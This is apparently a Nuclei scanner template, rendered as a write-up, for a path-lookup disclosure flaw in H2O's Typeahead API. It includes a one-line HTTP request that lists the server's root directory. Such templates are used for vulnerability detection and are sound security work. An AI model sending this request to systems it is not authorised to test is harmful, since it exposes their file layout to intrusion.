# Nuclei Template: H2O - Arbitrary Path Lookup
**Template ID:** h2o-arbitary-file-read
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-200
**Source:** Nuclei Template (`h2o-arbitary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
H2O allows for arbitrary path lookup via it's Typehead API endpoint

## Steps to reproduce / Exploit Payload
```http
GET /3/Typeahead/files?src=%2F&limit=10 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc/
